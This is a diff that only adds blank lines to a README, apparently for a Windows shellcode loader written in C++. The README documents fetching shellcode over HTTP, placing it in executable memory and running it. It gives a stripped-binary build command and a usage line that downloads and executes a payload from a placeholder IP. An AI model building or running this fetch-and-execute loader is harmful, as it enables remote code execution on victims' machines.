@@ -10,9 +10,11 @@ This tool demonstrates:
 
 > 🔐 Educational use only. Unauthorized use of this code is illegal.
 
+
 ## 📂 Filename
 
 **loader.cpp** – Console-based shellcode loader (C++)
+
 
 ## 📌 Technique
 
@@ -22,10 +24,12 @@ This tool demonstrates:
 - **Memory stage**: Allocates executable memory (`PAGE_EXECUTE_READWRITE`)
 - **Execution**: Transfers control to shellcode via a function pointer
 
+
 ## 🧱 Requirements
 
 - `x86_64-w64-mingw32-g++` (MinGW-w64)
 - Windows target
+
 
 ## ⚙️ Build
 
@@ -33,11 +37,13 @@ This tool demonstrates:
 x86_64-w64-mingw32-g++ loader.cpp -o loader.exe -static -lwininet -s -Wl,-subsystem,console
 ```
 
+
 ## 🧪 Usage
 
 ```bash
 loader.exe http://<ip_address>/shellcode.bin
 ```
+
 
 ## 🛠️ Example Shellcode Generation
 
